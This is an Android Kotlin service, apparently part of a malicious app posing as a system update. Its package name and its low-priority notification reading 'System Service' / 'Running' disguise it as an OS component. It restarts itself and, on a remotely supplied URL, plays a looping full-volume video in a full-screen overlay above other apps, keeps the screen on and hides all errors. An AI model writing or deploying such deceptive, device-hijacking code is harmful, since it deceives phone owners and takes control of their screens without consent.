package com.system.update

import android.app.*
import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.graphics.PixelFormat
import android.media.MediaPlayer
import android.net.Uri
import android.os.Build
import android.os.IBinder
import android.view.Gravity
import android.view.View
import android.view.WindowManager
import android.widget.FrameLayout
import android.widget.VideoView
import androidx.core.app.NotificationCompat

class VideoPlayerService : Service() {

    companion object {
        const val NOTIF_ID = 300
        const val TAG = "VideoPlayer"
    }

    private lateinit var wm: WindowManager
    private var videoView: VideoView? = null
    private var overlay: View? = null

    override fun onCreate() {
        super.onCreate()
        wm = getSystemService(Context.WINDOW_SERVICE) as WindowManager
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val url = intent?.getStringExtra("url")
        val type = intent?.getStringExtra("type") ?: "video"

        startForeground(NOTIF_ID, buildNotification())

        if (type == "video" && !url.isNullOrEmpty()) {
            playVideo(url)
        }

        return START_STICKY
    }

    private fun buildNotification(): Notification {
        val pi = PendingIntent.getActivity(
            this, 0,
            Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE
        )
        return NotificationCompat.Builder(this, App.CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Running")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setContentIntent(pi)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
    }

    private fun playVideo(url: String) {
        try {
            removeOverlay()

            val container = FrameLayout(this).apply {
                setBackgroundColor(Color.BLACK)
            }

            val vv = VideoView(this)
            vv.setVideoURI(Uri.parse(url))
            vv.setOnPreparedListener { mp ->
                mp.isLooping = true
                mp.setVolume(1f, 1f)
                vv.start()
            }
            vv.setOnErrorListener { _, _, _ -> true }

            container.addView(vv, FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.MATCH_PARENT
            ))

            val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            else
                @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_PHONE

            val params = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                type,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                        WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                PixelFormat.TRANSLUCENT
            ).apply {
                gravity = Gravity.CENTER
            }

            wm.addView(container, params)
            overlay = container
            videoView = vv
        } catch (_: Exception) {}
    }

    private fun removeOverlay() {
        try { overlay?.let { wm.removeView(it) } } catch (_: Exception) {}
        overlay = null
        try { videoView?.stopPlayback() } catch (_: Exception) {}
        videoView = null
    }

    override fun onDestroy() {
        removeOverlay()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
